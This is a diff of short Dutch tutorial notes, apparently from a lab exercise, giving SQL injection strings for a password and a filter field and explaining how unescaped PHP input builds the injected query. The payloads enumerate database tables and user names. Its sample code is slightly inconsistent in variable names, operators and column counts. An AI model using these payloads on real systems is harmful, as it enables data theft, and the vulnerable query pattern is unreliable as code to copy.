@@ -8,3 +8,34 @@ zet in password veld:
 
 ' UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables  WHERE table_schema NOT IN ('sys', 'mysql', 'information_schema') #
 
+
+Zet in filter veld:
+
+' UNION SELECT 1,2,name from users #
+
+
+
+Uitleg
+======
+
+Volledig statement is:
+
+SELECT * FROM articles WHERE name = 'handschoen'
+
+In de code wordt dit statement als volgt gemaakt:
+
+$id = $_POST["filter"];
+$sql = "SELECT name, price FROM articles WHERE name = '$filter'";
+
+Als je op de website bijvoorbeeld handschoen invoert krijg je:
+
+$sql = "SELECT name, price FROM articles WHERE name LIKE 'handschoen'";
+
+Injection, ipv 'handschoen':
+
+' UNION SELECT 1,2 FROM users #
+
+De code maak nu:
+
+$sql = "SELECT name, price FROM articles WHERE name = '' UNION SELECT 1,2 FROM users #'";
+
